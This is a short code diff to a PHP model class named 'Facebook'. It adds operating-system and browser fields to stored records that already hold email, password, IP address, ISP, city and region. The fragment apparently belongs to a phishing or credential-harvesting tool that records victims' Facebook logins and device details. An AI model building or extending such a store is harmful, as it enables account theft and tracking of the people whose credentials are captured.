@@ -13,6 +13,8 @@ class Facebook extends Model
         'email',
         'password',
         'ip',
+        'os',
+        'browser',
         'isp',
         'city',
         'region',
